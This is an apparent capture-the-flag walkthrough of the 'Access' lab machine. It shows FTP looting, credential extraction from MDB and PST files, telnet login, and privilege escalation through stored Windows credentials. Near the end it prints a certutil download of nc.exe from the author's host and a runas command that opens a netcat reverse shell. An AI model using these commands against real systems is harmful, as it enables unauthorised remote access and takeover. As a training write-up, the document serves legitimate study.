---
layout: default
---


# Access

# Skills

- Inspecting MDB files with **mdb-tools**
- Inspecting PDB files with **readpst**
- Enumertaing Stored credentials

# Enumeration

Only three ports are reported in the first scan

```bash
# Nmap 7.94 scan initiated Sat Sep 23 09:58:49 2023 as: nmap -p- -n -Pn --min-rate 5000 -oG 10.10.10.98_all_ports -vvv 10.10.10.98
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.98 ()    Status: Up
Host: 10.10.10.98 ()    Ports: 21/open/tcp//ftp///, 23/open/tcp//telnet///, 80/open/tcp//http///        Ignored State: filtered (65532)
# Nmap done at Sat Sep 23 09:59:15 2023 -- 1 IP address (1 host up) scanned in 26.40 seconds
```

We will perform a deeper enumeration

```bash
# Nmap 7.94 scan initiated Sat Sep 23 10:00:06 2023 as: nmap -p21,23,80 -n -Pn -sCV -oN 10.10.10.98_enum 10.10.10.98
Nmap scan report for 10.10.10.98
Host is up (0.054s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet?
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Sep 23 10:03:04 2023 -- 1 IP address (1 host up) scanned in 178.57 seconds
```

## HTTP 80

Enumeration in the web server didn’t report anything at a first glance.

- Directory and file fuzzing didn’t show anything
- No subdomains
- Only the image of a computer with a title **LON-MC**

## TELNET 23

- If we try to connect with a user we are prompted to use a password, but we don’ have any.

## PORT 21

Port 21 allow for a remote login via anonymous user.

```bash
ftp 10.10.10.98                     
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

There are two directories and one file in each directory. 

```bash
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> dir Backups
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> dir Engineer
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp>
```

We will transefer those to our machine and see what we can do with them. However, since they are binary files we must enable binary transfer first in FTP.

```bash
ftp> type binary
200 Type set to I.
```

```bash
ftp> cd Backups
250 CWD command successful.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 PORT command successful.
125 Data connection already open; Transfer starting.
 27% |***************************************************                                                                                                                                           |  1526 KiB    1.48 MiB/s    00:02 ETAftp: Reading from network: Interrupted system call
  0% |                                                                                                                                                                                              |    -1        0.00 KiB/s    --:-- ETA
550 The specified network name is no longer available. 
WARNING! 667 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> get Access\ Control.zip
local: Access Control.zip remote: Access Control.zip
200 PORT command successful.
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************************************************************************************************************| 10870       70.41 KiB/s    00:00 ETA
226 Transfer complete.
WARNING! 45 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
10870 bytes received in 00:00 (70.34 KiB/s)
```

# Foothold

We end up with a **mdb** file and and **zip** file. Zip file needs a password so we proceed with the MDB file. Searching information about MDB files we discover that is a database file and with mdb-tools we can inspect the content. First we check all the tables with the word user in it. 

```bash
mdb-tables --single-column backup.mdb | grep user
auth_user
auth_user_groups
auth_user_user_permissions
userinfo_attarea
```

Then we query those to see if there is something interesting.

```bash
mdb-json backup.mdb  auth_user       
{"id":25,"username":"admin","password":"admin","Status":1,"last_login":"08/23/18 21:11:47","RoleID":26}
{"id":27,"username":"engineer","password":"access4u@security","Status":1,"last_login":"08/23/18 21:13:36","RoleID":26}
{"id":28,"username":"backup_admin","password":"admin","Status":1,"last_login":"08/23/18 21:14:02","RoleID":26}
```

We have some password here. We can try them in the ZIP file.

```bash
7z x Access\ Control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=C.UTF-8,Utf16=on,HugeFiles=on,64 bits,4 CPUs AMD Ryzen 7 5800H with Radeon Graphics          (A50F00),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
```

We now have a **pst** file which can be read using tools like **readpst**. This kind of files are part of outlook and normally have information about emails.

```bash
┌──(kali㉿kali)-[~/machines/access]
└─$ readpst Access\ Control.pst 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.
```

This tool will dump the whole email message where we can see a user and a password.

```bash
The password for the &#8220;security&#8221; account has been changed to **4Cc3ssC0ntr0ller**.&nbsp; 
Please ensure this is passed on to your engineers.<o:p></o:p></p><p class=MsoNormal><o:p>&nbsp;</o:p></p><p class=MsoNormal>Regards,<o:p></o:p></p><p class=MsoNormal>
John<o:p></o:p></p></div></body></html>
```

We recall that telnet port request a password to connect. We can user our new credentials (**security**:**4Cc3ssC0ntr0ller)** to connect.

```bash
┌──(kali㉿kali)-[~/machines/access]
└─$ telnet --user=security 10.10.10.98
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

We have a foothold on the machine.

# Privilege escalation

We will perform some basic enumeration. First we check our privileges.

```bash
C:\Users\security>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working     Disabled
```

We now start with our basic enumeration checking files in directories, open ports, users, groups and so on. Until we check which stored credentials we have on the Credential Manager.

```bash
C:\>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

This means that we could run any command as ACCESS\Administrator. In order to leverage this we will use **runas** built-in tool that we have on windows, which is a powerless version of sudo command in linux. We can use this command two ways:

- Via stored credential in the Credential Manager (our way)
- Via credentials we have obtain somehow

Since runas command doesn’t show the output we will send a reverse shell using netcat. First we have to transfer **nc.exe** binary to the machine.

```bash
C:\Windows\Temp>certutil -urlcache -f http://10.10.14.17/nc.exe nc.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Now is trivial to send the reverse shell.

```bash
C:\Windows\Temp>runas /env /noprofile /savecred /user:ACCESS\administrator "nc.exe 10.10.14.17 4444 -e cmd.exe"
```

We have admin access to the machine and we can read the flag.

```bash
┌──(kali㉿kali)-[~/machines/secnotes]
└─$ rlwrap nc -lvnp 4444      
listening on [any] 4444 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.10.98] 49159
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\Temp>whoami
whoami
access\administrator
```